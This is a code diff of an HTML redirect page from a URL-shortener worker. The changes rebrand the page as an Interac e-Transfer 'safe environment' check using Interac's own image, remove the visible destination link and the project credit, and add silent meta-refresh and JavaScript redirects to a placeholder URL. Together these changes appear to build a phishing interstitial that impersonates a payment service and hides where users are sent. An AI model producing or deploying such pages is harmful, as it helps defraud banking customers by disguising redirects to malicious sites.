@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
-  <meta name="referrer" content="no-referrer" />
+	<meta http-equiv="Refresh" content="1; url={Replace}" />
+	<meta name="referrer" content="no-referrer" />
+	<title>Redirecting...</title>
   <style>
     body {
       display: flex;
@@ -17,9 +17,9 @@
       background-color: #f9f9f9;
     }
     img {
-      max-width: 50%;
-      height: auto;
-    }
+	  max-width: 50%; /* Изображение не будет шире контейнера */
+	  height: auto; /* Высота автоматически рассчитывается, сохраняя пропорции */
+	}
     .progress {
       margin-top: 20px;
       width: 80%;
@@ -39,63 +39,49 @@
       margin-top: 10px;
       font-size: 16px;
     }
+  </style>
+  <style>
     .circle {
-      display: inline-flex;
-      justify-content: center;
-      align-items: center;
-      width: 15px;
-      height: 15px;
-      border-radius: 50%;
-      background-color: #f0f0f0;
-      border: 1px solid #ccc;
-      font-size: 24px;
-      font-weight: bold;
-      color: #333;
+      display: inline-flex; /* Для центрирования текста */
+      justify-content: center; /* Горизонтальное центрирование */
+      align-items: center; /* Вертикальное центрирование */
+      width: 15px; /* Ширина круга */
+      height: 15px; /* Высота круга */
+      border-radius: 50%; /* Делает элемент круглым */
+      background-color: #f0f0f0; /* Фоновый цвет круга */
+      border: 1px solid #ccc; /* Граница круга */
+      font-size: 24px; /* Размер текста */
+      font-weight: bold; /* Жирный текст */
+      color: #333; /* Цвет текста */
     }
   </style>
 </head>
+
 <body>
-  <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
+	<img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
   <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
-  
   <div class="progress">
     <div class="progress-bar" id="progress-bar"></div>
   </div>
   <div class="percentage" id="percentage">0%</div>
-
-  <p>Redirecting to <a href="{Replace}" id="replace-url">{Replace}</a></p>
-  <a href="https://github.com/xyTom/Url-Shorten-Worker/" target="_self">Fork me on GitHub</a>
-
-  <script type="text/javascript">
-    let progress = 0;
-    const progressBar = document.getElementById('progress-bar');
+  
+	<script type="text/javascript">
+	const progressBar = document.getElementById('progress-bar');
     const percentage = document.getElementById('percentage');
-    const redirectURL = "{Replace}"; // Здесь будет подставлен целевой URL из воркера
+    let progress = 0;
 
-    // Функция для обновления шкалы загрузки
     const interval = setInterval(() => {
-      progress += 10;
-      progressBar.style.width = progress + '%';
-      percentage.textContent = progress + '%';
+      progress += 10; // Увеличиваем прогресс каждые 1 секунду
+      progressBar.style.width = progress + '%'; // Устанавливаем ширину шкалы
+      percentage.textContent = progress + '%'; // Отображаем процент
 
       if (progress >= 100) {
         clearInterval(interval);
-        redirectToURL();
-      }
-    }, 1100);
+		/* <![CDATA[ */
+		setTimeout('window.location.replace( "{Replace}" + window.location.hash );', 1000 )
 
-    // Функция для редиректа
-    function redirectToURL() {
-      if (redirectURL === "{Replace}" || !redirectURL) {
-        document.body.innerHTML = "<h1>Redirection failed: Missing target URL</h1>";
-      } else {
-        window.location.href = redirectURL;
-      }
-    }
-    
-    // Заменяем {Replace} на настоящий URL
-    document.getElementById("replace-url").href = redirectURL;
-    document.getElementById("replace-url").textContent = redirectURL;
-  </script>
+/* ]]> */
+	</script>
 </body>
+
 </html>
